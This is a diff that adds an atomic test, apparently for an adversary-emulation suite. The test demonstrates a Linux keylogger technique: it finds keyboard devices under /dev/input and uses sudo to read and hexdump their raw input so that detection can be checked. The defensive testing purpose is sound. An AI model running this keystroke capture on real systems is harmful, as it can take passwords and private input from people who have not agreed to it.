@@ -205,3 +205,16 @@ atomic_tests:
       kill `pgrep swift-frontend`
     name: bash
     elevation_required: false
+- name: Linux keylogger /dev/input file read elevated
+  description: |
+    These commands identify the keyboards and read from their file in /dev/input .
+    It is important to detect the file read, as the access can be done in an executable
+    without any Commands for detection.  Requires elevated privledges.
+  supported_platforms:
+    - linux
+  executor:
+    name: sh
+    elevation_required: true 
+    command: |
+      LINKS=`find /dev/input/by-path/ -type l -name "*kbd*"`
+      for L in ${LINKS} ; do f=`readlink -e "$L"` && echo $f && sudo timeout 5 cat "$f" | hexdump -n 512 ; done
